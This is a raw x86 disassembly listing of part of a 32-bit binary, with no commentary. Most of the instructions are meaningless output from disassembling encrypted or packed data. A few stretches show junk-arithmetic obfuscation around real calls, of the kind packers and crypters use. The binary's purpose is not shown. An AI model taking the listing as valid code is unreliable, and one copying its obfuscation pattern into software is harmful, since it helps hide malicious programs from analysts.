  40727d:	shr    BYTE PTR [esi-0xbb1c3ca],cl
  407283:	pop    esi
  407284:	iret   
  407285:	(bad)  
  407286:	cwde   
  407287:	mov    ah,BYTE PTR [eax+0x7a]
  40728a:	push   ss
  40728b:	push   ebp
  40728c:	inc    eax
  40728d:	in     al,0x23
  40728f:	mov    bl,0xef
  407291:	imul   esi,esp,0x41
  407294:	jnp    0x407243
  407296:	jl     0x407232
  407298:	xchg   BYTE PTR [ecx+0x2e],ah
  40729b:	lahf   
  40729c:	jne    0x407255
  40729e:	pushf  
  40729f:	jo     0x40730f
  4072a1:	mov    ebp,0x8e51d691
  4072a6:	test   BYTE PTR [edi+0x3b6a50e7],bh
  4072ac:	sbb    BYTE PTR [edi+0x5f26979e],ch
  4072b2:	sbb    al,0x1d
  4072b4:	daa    
  4072b5:	iret   
  4072b6:	dec    ebx
  4072b7:	adc    eax,0x26d725d3
  4072bc:	lods   eax,DWORD PTR ds:[esi]
  4072bd:	xchg   edi,eax
  4072be:	mov    ebp,DWORD PTR [ebx]
  4072c0:	in     eax,0x4a
  4072c2:	or     eax,0xaaadafef
  4072c7:	mov    ebp,0x4d4231d8
  4072cc:	lods   eax,DWORD PTR ds:[esi]
  4072cd:	cwde   
  4072ce:	aaa    
  4072cf:	jle    0x4072a4
  4072d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072d2:	xchg   ah,bh
  4072d4:	push   cs
  4072d5:	xchg   edx,eax
  4072d6:	popf   
  4072d7:	out    dx,eax
  4072d8:	cmp    al,0x66
  4072da:	or     ah,BYTE PTR ds:0xbe7713b1
  4072e0:	jmp    0x407324
  4072e2:	mov    ds:0x3523a7d2,al
  4072e7:	xor    edi,DWORD PTR [eax+0x7a]
  4072ea:	int    0xae
  4072ec:	ja     0x407289
  4072ee:	mov    dl,0x7b
  4072f0:	iret   
  4072f1:	(bad)  
  4072f3:	out    0x66,eax
  4072f5:	sbb    bh,ah
  4072f7:	out    dx,al
  4072f8:	push   ebp
  4072f9:	les    esi,FWORD PTR [edx-0x705d877b]
  4072ff:	sbb    BYTE PTR [eax+0xef92bf5],bh
  407305:	mov    al,0xa5
  407307:	clc    
  407308:	cld    
  407309:	push   esi
  40730a:	or     eax,0x29854e15
  40730f:	sub    al,BYTE PTR [ebx+0x18]
  407312:	popa   
  407313:	xchg   ebx,eax
  407314:	push   edx
  407315:	and    BYTE PTR [ebx],cl
  407317:	gs iret 
  407319:	add    esi,DWORD PTR [ecx+0x6c]
  40731c:	je     0x407312
  40731e:	js     0x4072d1
  407320:	add    eax,0xe04c4087
  407325:	mov    ebx,0xb6a7ac5c
  40732a:	dec    ebp
  40732b:	mov    ebp,0x9d3049
  407330:	push   ss
  407331:	imul   ecx,ecx,0xc0519d09
  407337:	mov    ch,0x8e
  407339:	mov    al,ds:0x51cba5ab
  40733e:	int3   
  40733f:	sbb    BYTE PTR [esi-0x2bcf4e25],0x63
  407346:	retf   0x458b
  407349:	hlt    
  40734a:	add    DWORD PTR ds:0x42fcd1,0x42e703
  407354:	xor    eax,esi
  407356:	add    DWORD PTR ds:0x42fcfd,0x57f6
  407360:	add    eax,edi
  407362:	xor    DWORD PTR ds:0x42e70f,0x2a11
  40736c:	mov    DWORD PTR [ebp-0x18],eax
  40736f:	mov    DWORD PTR [ebp-0x1c],0xf89c853c
  407376:	mov    BYTE PTR [ebp-0x1],0x67
  40737a:	and    DWORD PTR ds:0x42fcfd,0x0
  407384:	mov    eax,ds:0x42fcfd
  407389:	inc    eax
  40738a:	mov    ds:0x42fcfd,eax
  40738f:	cmp    DWORD PTR ds:0x42fcfd,0xe
  407396:	jne    0x4073a2
  40739c:	call   DWORD PTR ds:0x42e45f
  4073a2:	cmp    DWORD PTR ds:0x42fcfd,0xd
  4073a9:	jne    0x4073ba
  4073af:	mov    eax,ds:0x42fcfd
  4073b4:	inc    eax
  4073b5:	mov    ds:0x42fcfd,eax
  4073ba:	cmp    DWORD PTR ds:0x42fcfd,0x1d
  4073c1:	jb     0x407384
  4073c7:	mov    eax,DWORD PTR [ebp-0xc]
  4073ca:	xor    eax,esi
  4073cc:	and    DWORD PTR ds:0x42e128,0xdb
  4073d6:	add    eax,edi
  4073d8:	or     DWORD PTR ds:0x42e707,0x71a5
  4073e2:	mov    DWORD PTR [ebp-0x18],eax
  4073e5:	adc    eax,0x7137
  4073ea:	jmp    0x407737
  4073ef:	or     DWORD PTR ds:[edi],eax
  4073f2:	(bad)  
  4073f3:	rcl    edx,cl
  4073f5:	cmp    DWORD PTR [ecx],edx
  4073f7:	pop    ecx
  4073f8:	jns    0x4073c5
  4073fa:	popa   
  4073fb:	mov    ds:0xf7edb3b4,eax
  407400:	iret   
  407401:	jo     0x407473
  407403:	and    BYTE PTR [ebp+0x70],bh
  407406:	jo     0x4073cf
  407408:	in     eax,dx
  407409:	inc    ebp
  40740a:	lods   eax,DWORD PTR ds:[esi]
  40740b:	mov    ebx,0x530bb145
  407410:	push   cs
  407411:	jp     0x40739f
  407413:	mov    cl,0x6b
  407415:	jb     0x4073e9
  407417:	scas   eax,DWORD PTR es:[edi]
  407418:	fild   QWORD PTR [ebx]
  40741a:	das    
  40741b:	test   eax,0x33a5c277
  407420:	in     eax,0x45
  407422:	scas   eax,DWORD PTR es:[edi]
  407423:	xor    ebx,ebx
  407425:	sbb    al,0x94
  407427:	aam    0x92
  407429:	jnp    0x4073cf
  40742b:	jg     0x407444
  40742d:	dec    esi
  40742e:	and    eax,0xa5460015
  407433:	pop    eax
  407434:	mov    ecx,edi
  407436:	les    edi,FWORD PTR [edi-0x62]
  407439:	fnsave [edx-0x4366a5f5]
  40743f:	adc    bh,BYTE PTR [edx]
  407441:	mov    ebx,0x2cccc895
  407446:	xchg   esi,eax
  407447:	jb     0x4074a2
  407449:	stos   DWORD PTR es:[edi],eax
  40744a:	int3   
  40744b:	fisttp DWORD PTR [ebp+ecx*1-0x120673e]
  407452:	mov    al,BYTE PTR [ebx]
  407454:	or     esp,DWORD PTR [ecx+0x609e2863]
  40745a:	lock xor ch,BYTE PTR [ecx-0x3945f2de]
  407461:	out    dx,eax
  407462:	xchg   esi,eax
  407463:	pop    edx
  407464:	mov    ds:0x88b1a80e,eax
  407469:	loope  0x4073f9
  40746b:	les    edx,FWORD PTR [esi]
  40746d:	adc    eax,0xeec3d92
  407472:	pop    edi
  407473:	pop    ss
  407474:	call   0x23c00140
  407479:	jl     0x40740f
  40747b:	nop
  40747c:	sbb    cl,dh
  40747e:	fs mov ecx,0x66debfa4
  407484:	mov    ecx,0xaaaa45ca
  407489:	inc    esp
  40748a:	outs   dx,DWORD PTR ds:[esi]
  40748b:	scas   al,BYTE PTR es:[edi]
  40748c:	pop    ss
  40748d:	cmp    DWORD PTR ds:0x9c1263dc,edx
  407493:	sbb    eax,0xcfdaa0b5
  407498:	retf   
  407499:	stc    
  40749a:	test   ah,al
  40749c:	mov    bh,0x81
  40749e:	sub    BYTE PTR [edx+0xf2d49dd],ah
  4074a4:	sub    al,0xae
  4074a6:	loop   0x407467
  4074a8:	in     eax,dx
  4074a9:	dec    esi
  4074aa:	dec    edx
  4074ab:	dec    ecx
  4074ac:	sbb    eax,0xc446e398
  4074b1:	jl     0x4074e1
  4074b3:	push   cs
  4074b4:	int    0x12
  4074b6:	sbb    ch,BYTE PTR [edi-0x4c]
  4074b9:	int    0x9f
  4074bb:	lds    ecx,FWORD PTR [edi*8-0x2e647b4a]
  4074c2:	shl    BYTE PTR [eax-0x1449ab45],1
  4074c8:	push   cs
  4074c9:	sub    BYTE PTR [esi-0x4a0deb8],0x98
  4074d0:	and    eax,0x51391f1
  4074d5:	push   ds
  4074d6:	shl    BYTE PTR [edi-0x1c80ba6],0x87
  4074dd:	mov    dl,0x30
  4074df:	call   0x1d306790
  4074e4:	push   ebx
  4074e5:	jo     0x407499
  4074e7:	adc    BYTE PTR [esp+esi*1-0x29],dl
  4074eb:	lahf   
  4074ec:	xor    eax,0x222f178d
  4074f1:	xor    dh,BYTE PTR [ebx-0x48]
  4074f4:	loope  0x40748b
  4074f6:	inc    esi
  4074f7:	jl     0x407555
  4074f9:	loope  0x4074b1
  4074fb:	sub    eax,0x25582fdc
  407500:	sbb    eax,0xb826c9d
  407505:	(bad)  
  407506:	repnz push ebx
  407508:	ds ss dec ebp
  40750b:	and    BYTE PTR ds:0x5602c6f1,bl
  407511:	mov    gs,edi
  407513:	addr16 int3 
  407515:	das    
  407516:	sti    
  407517:	cli    
  407518:	mov    dh,0x48
  40751a:	xchg   edx,eax
  40751b:	push   ds
  40751c:	adc    al,0x84
  40751e:	mov    es,esi
  407520:	lahf   
  407521:	pop    edx
  407522:	data16 cld 
  407524:	xor    ecx,ebx
  407526:	mov    ch,0x6b
  407528:	js     0x4074c8
  40752a:	adc    eax,0x4d58bc93
  40752f:	loop   0x407561
  407531:	pop    eax
  407532:	mov    DWORD PTR [ecx+0x3890437d],edi
  407538:	in     al,dx
  407539:	out    0xc7,al
  40753b:	ins    BYTE PTR es:[edi],dx
  40753c:	xchg   ebx,eax
  40753d:	clc    
  40753e:	test   DWORD PTR ds:0x8b35132f,eax
  407544:	aas    
  407545:	and    cl,ah
  407547:	sub    al,0x91
  407549:	mov    ch,0x52
  40754b:	call   0x6132:0x221159f0
  407552:	push   ss
  407553:	cli    
  407554:	push   edx
  407555:	out    0x40,al
  407557:	rol    BYTE PTR [ecx],0x30
  40755a:	popa   
  40755b:	js     0x407589
  40755d:	(bad)  
  40755e:	int    0x36
  407560:	mov    ebp,0xfe4e08ba
  407565:	(bad)  
  407566:	xor    ebx,edi
  407568:	loopne 0x407585
  40756a:	nop
  40756b:	data16 clc 
  40756d:	cwde   
  40756e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40756f:	mov    edi,esp
  407571:	push   0xffffffe8
  407573:	pusha  
  407574:	push   ecx
  407575:	or     bl,BYTE PTR [ebp+0x18]
  407578:	jmp    0xf033:0xc502da55
  40757f:	arpl   WORD PTR [ecx-0x28d491d2],di
  407585:	mov    eax,ds:0x93fb481b
  40758a:	in     al,dx
  40758b:	push   edx
  40758c:	cli    
  40758d:	test   eax,0xd60db6b2
  407592:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407593:	sub    BYTE PTR [ecx-0x12bbe8db],0x33
  40759a:	ror    DWORD PTR [ebx+0x4cfd14ad],1
  4075a0:	inc    esp
  4075a1:	pop    es
  4075a2:	jle    0x4075e3
  4075a4:	outs   dx,BYTE PTR ds:[esi]
  4075a5:	xor    cl,BYTE PTR [ebx+0x5b]
  4075a8:	cwde   
  4075a9:	inc    ebp
  4075aa:	jb     0x40756e
  4075ac:	fst    QWORD PTR ds:0xa190e197
  4075b2:	xor    BYTE PTR [edi-0x6a],dl
  4075b5:	mov    esi,0xcee2d89a
  4075ba:	sbb    al,0x6e
  4075bc:	mov    dh,0x8a
  4075be:	pushf  
  4075bf:	scas   eax,DWORD PTR es:[edi]
  4075c0:	cmp    dh,bl
  4075c2:	imul   eax,DWORD PTR [ebx+0x189cfa49],0xf9775177
  4075cc:	mov    edx,0xe5790dfa
  4075d1:	sbb    ch,BYTE PTR [esi-0x48]
  4075d4:	aad    0x3
  4075d6:	pusha  
  4075d7:	xchg   ebp,eax
  4075d8:	fs and al,0x2e
  4075db:	retf   
  4075dc:	es push esp
  4075de:	ins    DWORD PTR es:[edi],dx
  4075df:	bound  esi,QWORD PTR [eax]
  4075e1:	hlt    
  4075e2:	pop    ss
  4075e3:	nop
  4075e4:	inc    esp
  4075e5:	cdq    
  4075e6:	mov    ecx,ecx
  4075e8:	sub    eax,DWORD PTR [edi+ecx*4]
  4075eb:	aad    0x6a
  4075ed:	adc    ah,ch
  4075ef:	push   ebx
  4075f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075f1:	adc    esi,esp
  4075f3:	xor    DWORD PTR [eax-0x414ba9d0],eax
  4075f9:	call   0x74f65eaa
  4075fe:	xchg   ecx,eax
  4075ff:	mov    BYTE PTR [esi+ebp*1-0x2d42be6],0xcd
  407607:	jecxz  0x407653
  407609:	and    BYTE PTR [edi-0x7f],dl
  40760c:	ins    DWORD PTR es:[edi],dx
  40760d:	mov    edi,0x49635a2c
  407612:	mov    dh,BYTE PTR [ebx+0x208d977e]
  407618:	push   ecx
  407619:	std    
  40761a:	(bad)
  40761d:	rcr    DWORD PTR [ecx-0x7e6f23ac],cl
  407623:	mov    eax,0x509792a1
  407628:	mov    edi,0x10db2e36
  40762d:	cmp    BYTE PTR [edx],ch
  40762f:	hlt    
  407630:	mov    al,0xe6
  407632:	mov    ebx,edx
  407634:	push   0xffffffb7
  407636:	sub    BYTE PTR [ebp+ecx*2-0x62],cl
  40763a:	frstor [ebp-0x2f]
  40763d:	sub    BYTE PTR [esi+0x4dee76e5],ch
  407643:	aam    0xba
  407645:	jno    0x4075fa
  407647:	jno    0x4075dc
  407649:	aam    0xfc
  40764b:	cmp    cl,ch
  40764d:	push   ebx
  40764e:	mov    ebx,0x5e38ed89
  407653:	and    esi,edi
  407655:	into   
  407656:	or     esp,DWORD PTR [ebp-0x1434b18a]
  40765c:	mov    dh,0xc7
  40765e:	fadd   st(4),st
  407660:	xor    DWORD PTR [eax],edi
  407662:	sti    
  407663:	inc    edi
  407664:	pop    edi
  407665:	scas   eax,DWORD PTR es:[edi]
  407666:	dec    ebx
  407667:	in     al,0xef
  407669:	push   ds
  40766a:	pop    edi
  40766b:	push   es
  40766c:	push   esp
  40766d:	push   eax
  40766e:	arpl   WORD PTR [ebx-0x3],di
  407671:	mov    BYTE PTR [esp+esi*2+0x4469a023],bh
  407678:	mov    esp,DWORD PTR [edi-0x1e09d7a0]
  40767e:	stos   BYTE PTR es:[edi],al
  40767f:	btr    DWORD PTR [esi],0x73
  407683:	inc    edi
  407684:	daa    
  407685:	jno    0x4076be
  407687:	push   eax
  407688:	jecxz  0x407652
  40768a:	iret   
  40768b:	bswap  eax
  40768d:	stos   DWORD PTR es:[edi],eax
  40768e:	js     0x4076c2
  407690:	jno    0x4076ab
  407692:	iret   
  407693:	xchg   edx,eax
  407694:	fs lock jnp 0x40765d
  407698:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407699:	pop    ds
  40769a:	and    dh,BYTE PTR [ecx-0x53]
  40769d:	shr    dl,cl
  40769f:	mov    cl,0xfd
  4076a1:	or     cl,BYTE PTR [ecx-0x6ef6e28f]
  4076a7:	mov    ch,BYTE PTR [ebx]
  4076a9:	inc    edx
  4076aa:	jne    0x40762d
  4076ac:	dec    esi
  4076ad:	popa   
  4076ae:	mov    ds:0x605d5dfc,al
  4076b3:	jmp    FWORD PTR [ebx]
  4076b5:	shl    BYTE PTR [ecx],0x99
  4076b8:	into   
  4076b9:	enter  0x8b47,0x48
  4076bd:	inc    BYTE PTR [edx-0xa]
  4076c0:	mov    eax,0x2431e7e
  4076c5:	jns    0x40767e
  4076c7:	ret    
  4076c8:	xchg   edx,eax
  4076c9:	sbb    eax,0xdddb7769
  4076ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076cf:	sbb    DWORD PTR [ebp-0x73],eax
  4076d2:	mov    eax,0x28f9db24
  4076d7:	and    DWORD PTR [ebp+0x38],0xe
  4076db:	fisttp QWORD PTR [edx+ecx*2-0x785f412e]
  4076e3:	aaa    
  4076e4:	out    0x48,eax
  4076e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076e7:	fld    DWORD PTR [edi+0x7b]
  4076ea:	dec    eax
  4076eb:	push   0x2
  4076ed:	cwde   
  4076ee:	stos   DWORD PTR es:[edi],eax
  4076ef:	add    cl,BYTE PTR [eax-0x2b2ee898]
  4076f5:	pusha  
  4076f6:	or     BYTE PTR [ecx-0x4bbb3503],bh
  4076fc:	push   ds
  4076fd:	sbb    DWORD PTR es:[ebp-0x6d],ebx
  407701:	mov    WORD PTR [ebx+edi*8+0x4616c9c3],ss
  407708:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407709:	mov    eax,0x97d32d2
  40770e:	adc    dh,dh
  407710:	enter  0xd028,0x51
  407714:	retf   0x9817
  407717:	fld    TBYTE PTR [esi+edi*4]
  40771a:	xor    al,al
  40771c:	push   ds
  40771d:	and    BYTE PTR [edx],0xfa
  407720:	jp     0x40776b
  407722:	imul   esp,ecx,0xffffffe0
  407725:	adc    BYTE PTR [ebp+0x5ca18721],ah
  40772b:	jns    0x407738
  40772d:	jmp    0xc51a:0xdf7d84db
  407734:	jl     0x407781
  407736:	dec    esi
  407737:	mov    eax,DWORD PTR [ebp-0x24]
  40773a:	xor    eax,esi
  40773c:	add    eax,edi
  40773e:	adc    DWORD PTR ds:0x42e11c,0x42fd09
  407748:	push   eax
  407749:	inc    eax
  40774a:	mov    eax,DWORD PTR [ebp-0x28]
  40774d:	sbb    DWORD PTR ds:0x42fcd1,0x6777
  407757:	xor    eax,esi
  407759:	add    eax,edi
  40775b:	push   eax
  40775c:	mov    eax,DWORD PTR [ebp-0x1c]
  40775f:	or     DWORD PTR ds:0x42e6ef,0x4a3f
  407769:	xor    eax,esi
  40776b:	add    DWORD PTR ds:0x42fcf1,0x266c
  407775:	add    eax,edi
  407777:	xor    DWORD PTR ds:0x42e70f,0x42e6eb
  407781:	push   eax
  407782:	lea    eax,[ebp-0x78]
  407785:	push   eax
  407786:	add    DWORD PTR ds:0x42e6ff,0x5eb6
  407790:	push   DWORD PTR [ebp-0xc]
  407793:	adc    DWORD PTR ds:0x42e703,0x2bbb
  40779d:	push   DWORD PTR [ebp-0x14]
  4077a0:	call   0x405e60
  4077a5:	adc    DWORD PTR ds:0x42fce5,0x42fd6e
  4077af:	test   eax,eax
  4077b1:	je     0x407e83
  4077b7:	lea    eax,[ebp-0x78]
  4077ba:	sbb    DWORD PTR ds:0x42fd82,0x6660
  4077c4:	push   eax
  4077c5:	mov    eax,DWORD PTR [ebp-0x14]
  4077c8:	jmp    0x407b15
  4077cd:	xlat   BYTE PTR ds:[ebx]
  4077ce:	and    BYTE PTR [eax+eiz*8+0x73],ch
  4077d2:	ins    BYTE PTR es:[edi],dx
  4077d3:	push   ebx
  4077d4:	aaa    
  4077d5:	pop    edx
  4077d6:	push   ecx
  4077d7:	push   ebx
  4077d8:	sahf   
  4077d9:	fadd   DWORD PTR [edx+0xc]
  4077dc:	das    
  4077dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077de:	int3   
  4077df:	jo     0x407851
  4077e1:	and    BYTE PTR [ebp+0x70],bh
  4077e4:	jo     0x407827
  4077e6:	and    DWORD PTR [edi],esi
  4077e8:	mov    WORD PTR [eax],gs
  4077ea:	or     eax,DWORD PTR [ecx]
  4077ec:	jae    0x407862
  4077ee:	add    al,0x4b
  4077f0:	nop
  4077f1:	mov    cl,0x60
  4077f3:	cdq    
  4077f4:	lock loope 0x407783
  4077f7:	cwde   
  4077f8:	enter  0x1974,0x99
  4077fc:	mov    gs,edi
  4077fe:	or     DWORD PTR [esi-0x29],eax
  407801:	push   fs
  407803:	jb     0x4077ce
  407805:	sub    al,0xca
  407807:	fsub   DWORD PTR [ecx]
  407809:	dec    esp
  40780a:	lods   eax,DWORD PTR ds:[esi]
  40780b:	fidiv  DWORD PTR [ecx+0x71]
  40780e:	retf   
  40780f:	and    al,0xb9
  407811:	and    al,0x94
  407813:	std    
  407814:	stc    
  407815:	jmp    0xd30e:0x715d9662
  40781c:	mov    bh,0xe
  40781e:	(bad)  
  40781f:	pop    ecx
  407820:	xchg   edx,eax
  407821:	fidiv  WORD PTR [eax-0x28]
  407824:	jg     0x4077f7
  407826:	jmp    0x2c7c:0x64f15458
  40782d:	out    dx,al
  40782e:	shr    DWORD PTR [ebp-0x1289ddb9],0xdd
  407835:	inc    esp
  407836:	mov    cl,0xaa
  407838:	popf   
  407839:	repz inc edx
  40783b:	xchg   ebx,eax
  40783c:	or     DWORD PTR [ebx+0x1b78fab1],edi
  407842:	mov    ecx,DWORD PTR [eax]
  407844:	fwait
  407845:	imul   BYTE PTR [ecx]
  407847:	out    dx,al
  407848:	mov    ah,0xf5
  40784a:	push   edi
  40784b:	push   edi
  40784c:	push   ds
  40784d:	fild   QWORD PTR [ebx+eiz*8]
  407850:	jbe    0x407815
  407852:	add    DWORD PTR [edx+esi*2],ebp
  407855:	cmovae edx,DWORD PTR [ecx]
  407858:	xchg   esp,eax
  40785a:	mov    ss,WORD PTR [esi+0x2f6da623]
  407860:	mov    edx,DWORD PTR [ebx-0x2e]
  407863:	push   edi
  407864:	add    eax,0xe5bcd6e8
  407869:	stos   DWORD PTR es:[edi],eax
  40786a:	js     0x407881
  40786c:	xchg   edi,eax
  40786d:	ffree  st(0)
  40786f:	(bad)  
  407870:	or     dl,ch
  407872:	stos   BYTE PTR es:[edi],al
  407873:	inc    esi
  407874:	jecxz  0x40783b
  407876:	inc    ebp
  407877:	push   ecx
  407878:	sub    eax,0x84ac5141
  40787d:	into   
  40787e:	adc    esi,DWORD PTR ds:0xd9d5a979
  407884:	ja     0x407808
  407886:	ins    DWORD PTR es:[edi],dx
  407887:	mov    edx,0xda003ab6
  40788c:	adc    al,0xa8
  40788e:	cs inc ebx
  407890:	repz sub ecx,DWORD PTR [eax+0x27bb2c7b]
  407897:	loop   0x407852
  407899:	or     BYTE PTR [eax+esi*2],bh
  40789c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40789d:	mov    edx,0xe3c2b8fd
  4078a2:	ret    0xaae1
  4078a5:	shl    DWORD PTR [edx-0x76],1
  4078a8:	test   bl,al
  4078aa:	loope  0x4078ae
  4078ac:	(bad)  
  4078ae:	bound  esi,QWORD PTR [ecx]
  4078b0:	sub    BYTE PTR [ebp+0x1716e273],bl
  4078b6:	in     eax,dx
  4078b7:	adc    BYTE PTR [esp+eiz*8-0x764bac8b],bl
  4078be:	rol    BYTE PTR [ebp-0x3d],cl
  4078c1:	fldenv [ebp-0xa]
  4078c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078c5:	mov    edx,0xe352b4a1
  4078ca:	mov    bl,0x2d
  4078cc:	xchg   BYTE PTR [edi+0x48],al
  4078cf:	pop    ebp
  4078d0:	and    BYTE PTR [edi-0x75],dh
  4078d3:	adc    esp,DWORD PTR [ebx]
  4078d5:	push   eax
  4078d6:	ss ret 
  4078d8:	fcomp  QWORD PTR [edx+ebx*1]
  4078db:	pop    ds
  4078dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078dd:	leave  
  4078de:	and    DWORD PTR [esp+eax*2+0x313bbf9e],esp
  4078e5:	les    eax,FWORD PTR [esi+0x2adf27e7]
  4078eb:	in     eax,0x8e
  4078ed:	adc    al,0x9
  4078ef:	xchg   esi,eax
  4078f0:	mov    eax,ds:0xc39a6b92
  4078f5:	dec    esi
  4078f6:	(bad)  
  4078f7:	mov    bh,0x47
  4078f9:	lea    ebp,[edi]
  4078fb:	xchg   edx,eax
  4078fc:	cmp    eax,0x88bee42b
  407901:	shl    DWORD PTR [eax],cl
  407903:	mov    ecx,0x64f0f4ef
  407908:	mov    dl,0x22
  40790a:	in     al,dx
  40790b:	call   0xc0508e44
  407910:	sbb    eax,0xf29e3c24
  407915:	cmp    BYTE PTR [esi+0x2b3f03d8],bh
  40791b:	mov    dl,0x89
  40791d:	outs   dx,DWORD PTR ds:[esi]
  40791e:	pusha  
  40791f:	test   DWORD PTR ds:0x604a17a2,edx
  407925:	jmp    DWORD PTR ds:0x5e9b8ab5
  40792b:	cld    
  40792c:	mov    esi,0xeb36a790
  407931:	int    0xb9
  407933:	cdq    
  407934:	pop    eax
  407935:	xchg   ebp,eax
  407936:	mov    WORD PTR [ebx+0x5f],cs
  407939:	mov    ch,0xe5
  40793b:	outs   dx,BYTE PTR ds:[si]
  40793d:	hlt    
  40793e:	fs push edi
  407940:	outs   dx,BYTE PTR ds:[esi]
  407941:	jp     0x407915
  407943:	push   edi
  407944:	in     eax,dx
  407945:	xor    bh,BYTE PTR [ebx+0x1d6d266c]
  40794b:	push   ebx
  40794c:	jmp    0x5cc4:0xdd522d05
  407953:	jmp    0xaab3efd8
  407958:	(bad)  
  407959:	test   al,0xbf
  40795b:	sub    DWORD PTR gs:[eax-0x4],esp
  40795f:	out    dx,al
  407960:	call   0x6df78a3
  407965:	xchg   edi,eax
  407966:	ret    0xc902
  407969:	icebp  
  40796a:	dec    edx
  40796b:	pop    ds
  40796c:	and    al,0xaa
  40796e:	aas    
  40796f:	sahf   
  407970:	ror    DWORD PTR [eax],cl
  407972:	cmp    DWORD PTR [esi+eiz*4-0x6a],ecx
  407976:	retf   
  407977:	adc    al,0x73
  407979:	out    0x54,al
  40797b:	lds    ebx,FWORD PTR [eax-0x2e]
  40797e:	dec    edi
  40797f:	out    0x21,al
  407981:	jmp    0x4079e3
  407983:	mov    ds:0x3cc77a0e,eax
  407988:	add    BYTE PTR [esi-0x73de8a54],bh
  40798e:	inc    edx
  40798f:	out    dx,al
  407990:	mov    DWORD PTR [esi],ebp
  407992:	jmp    0x407933
  407994:	pop    ebp
  407995:	mov    DWORD PTR [eiz*1-0x2f56053b],edi
  40799c:	popa   
  40799d:	cmp    DWORD PTR [ecx+0x34],esi
  4079a0:	js     0x407a20
  4079a2:	sbb    DWORD PTR [ebp+0x559fd9c3],edx
  4079a8:	dec    edx
  4079a9:	and    esp,DWORD PTR [eax]
  4079ab:	mov    ch,cl
  4079ad:	sub    eax,0xb8baaf2a
  4079b2:	sahf   
  4079b3:	mov    cl,0xc2
  4079b5:	clc    
  4079b6:	jnp    0x407a1d
  4079b8:	mov    eax,ds:0xb48cee41
  4079bd:	idiv   ebx
  4079bf:	(bad)  
  4079c0:	lods   eax,DWORD PTR ds:[esi]
  4079c1:	aam    0xca
  4079c3:	xchg   ecx,eax
  4079c4:	std    
  4079c5:	stos   DWORD PTR es:[edi],eax
  4079c6:	aam    0x98
  4079c8:	sahf   
  4079c9:	add    edi,DWORD PTR [ecx-0x67f2ad62]
  4079cf:	fisub  WORD PTR [ebp+edx*1+0x50]
  4079d3:	jle    0x8039937
  4079d9:	xchg   esi,eax
  4079da:	lods   eax,DWORD PTR ds:[esi]
  4079db:	data16 jbe 0x4079c0
  4079de:	fistp  DWORD PTR [eax-0x2c895787]
  4079e4:	push   esp
  4079e5:	cmp    al,0x9b
  4079e7:	scas   al,BYTE PTR es:[edi]
  4079e8:	daa    
  4079e9:	sbb    BYTE PTR [eax],cl
  4079eb:	addr16 ss xchg edx,eax
  4079ee:	ret    
  4079ef:	mov    ch,0x0
  4079f1:	fmul   st,st(0)
  4079f3:	aas    
  4079f4:	test   BYTE PTR [esi+ebp*4+0x12],ch
  4079f8:	ds jnp 0x4079d4
  4079fb:	and    ebp,ebp
  4079fd:	test   BYTE PTR [ecx],dh
  4079ff:	sbb    DWORD PTR [eax],edx
  407a01:	loopne 0x4079ea
  407a03:	ret    0x6093
  407a06:	xor    ah,BYTE PTR [edx]
  407a08:	push   cs
  407a09:	call   0x53c22953
  407a0e:	test   DWORD PTR [eax+edx*4],eax
  407a11:	push   0x836a39f0
  407a16:	push   edi
  407a17:	cmp    DWORD PTR [ebp+edi*2-0x4c70684],esi
  407a1e:	les    ebp,FWORD PTR [ebp+0x250dc830]
  407a24:	out    0x11,eax
  407a26:	aas    
  407a27:	fwait
  407a28:	add    DWORD PTR es:[eax],edx
  407a2b:	lock cmp dl,0xc
  407a2f:	add    eax,0xbb4f33fd
  407a34:	mov    esp,0x5e825422
  407a39:	jo     0x407a8c
  407a3b:	hlt    
  407a3c:	cmp    bl,cl
  407a3e:	mov    ebp,0xe38d4412
  407a43:	fwait
  407a44:	stc    
  407a45:	icebp  
  407a46:	pop    ebp
  407a47:	ret    
  407a48:	test   BYTE PTR [eax],ah
  407a4a:	and    esp,DWORD PTR [edx]
  407a4c:	stc    
  407a4d:	jecxz  0x407a83
  407a4f:	pushf  
  407a50:	push   ecx
  407a51:	fnclex 
  407a53:	inc    esp
  407a54:	jb     0x407aa4
  407a56:	arpl   WORD PTR [esi-0x36],dx
  407a59:	(bad)  
  407a5b:	or     eax,DWORD PTR [edx+0x25ff1866]
  407a61:	cld    
  407a62:	dec    ebx
  407a63:	retf   0x9ec
  407a66:	mov    eax,0xba2001f5
  407a6b:	pop    ebx
  407a6c:	and    ch,BYTE PTR [edi-0x47]
  407a6f:	aam    0xb0
  407a71:	(bad)  
  407a72:	mov    ecx,0x31dbae1a
  407a77:	retf   
  407a78:	pop    ecx
  407a79:	(bad)  
  407a7a:	fistp  QWORD PTR [ebx-0x5c]
  407a7d:	or     eax,0xc9d20a4a
  407a82:	mov    edi,0x1966d437
  407a87:	xor    DWORD PTR [eax],ecx
  407a89:	inc    edi
  407a8a:	test   cl,ch
  407a8c:	fadd   DWORD PTR [edx+0x2e0d968e]
  407a92:	fidiv  DWORD PTR [ebx]
  407a94:	gs pop edi
  407a96:	out    dx,eax
  407a97:	data16 sti 
  407a99:	and    BYTE PTR [ebx],dl
  407a9b:	dec    edi
  407a9c:	ret    
  407a9d:	push   esi
  407a9e:	retf   
  407a9f:	xor    edx,ebx
  407aa1:	pop    ecx
  407aa2:	mov    ss,ebx
  407aa4:	xor    eax,0xd1cddc57
  407aa9:	add    BYTE PTR [ebx+eiz*8-0x2549c281],cl
  407ab0:	std    
  407ab1:	mov    ah,0x6e
  407ab3:	xor    al,0xd2
  407ab5:	dec    edx
  407ab6:	stos   BYTE PTR es:[edi],al
  407ab7:	and    eax,0x1df10fd0
  407abc:	add    BYTE PTR [eax+0x14],ch
  407abf:	iret   
  407ac0:	push   es
  407ac1:	mov    eax,ds:0xe6748359
  407ac6:	pop    eax
